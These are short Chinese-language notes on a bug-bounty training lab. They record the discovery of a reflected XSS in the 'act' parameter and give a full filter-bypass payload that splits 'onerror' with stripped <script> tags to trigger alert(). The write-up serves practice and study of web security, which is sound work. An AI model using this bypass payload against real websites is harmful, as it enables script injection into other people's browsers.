该靶场有好几个xss，还有越权
目前找到一个xss
# xss1
主页点击login并且填入账号密码，burp抓到包?act=login
发现login是反射点
尝试?act=xxx
![[Pasted image 20240910091543.png]]
尝试`<img src=1 onerror=alert() >`
发现on+字符会置空，还有script标签也会置空
经过一小时尝试
payload：
`https://www.bugbountytraining.com/fastfoodhackings/index.php?act=xxx--%3E%3Cimg%20src=1%20o%3Cscript%3Ener%3Cscript%3Eror=alert()%3E\\`
在on之间插入置空的<script>